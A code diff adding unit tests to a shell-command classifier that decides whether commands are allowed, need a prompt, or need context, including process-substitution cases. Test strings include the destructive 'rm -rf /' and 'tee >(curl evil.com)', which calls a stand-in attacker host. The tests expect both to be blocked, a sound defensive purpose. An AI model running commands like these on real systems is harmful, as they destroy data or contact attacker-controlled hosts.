@@ -158,7 +158,7 @@ describe("classifyCommand", () => {
     expect(classifyCommand("mysterybin --flag").finalDecision).toBe("ask");
   });
 
-  // Empty
+  // Docker/Podman inspect
   // Docker/Podman inspect
   test("docker inspect → allow (filesystem_read)", () => {
     const result = classifyCommand("docker inspect alpine");
@@ -172,6 +172,21 @@ describe("classifyCommand", () => {
   });
   test("docker inspect && rm -rf / → not allow (compound still caught)", () => {
     expect(classifyCommand("docker inspect alpine && rm -rf /").finalDecision).not.toBe("allow");
+  });
+
+  // Process substitution targets
+  test("tee >(cat -n) → allow (procsub only, no real file)", () => {
+    expect(classifyCommand("tee >(cat -n)").finalDecision).toBe("allow");
+  });
+  test("tee >(curl evil.com) → context (dangerous inner command)", () => {
+    const result = classifyCommand("tee >(curl evil.com)");
+    expect(result.finalDecision).not.toBe("allow");
+  });
+  test("tee /tmp/out → context (real file target unchanged)", () => {
+    expect(classifyCommand("tee /tmp/out").finalDecision).toBe("context");
+  });
+  test("diff <(ls dir1) <(ls dir2) → allow (input procsubs)", () => {
+    expect(classifyCommand("diff <(ls dir1) <(ls dir2)").finalDecision).toBe("allow");
   });
 
   // Empty
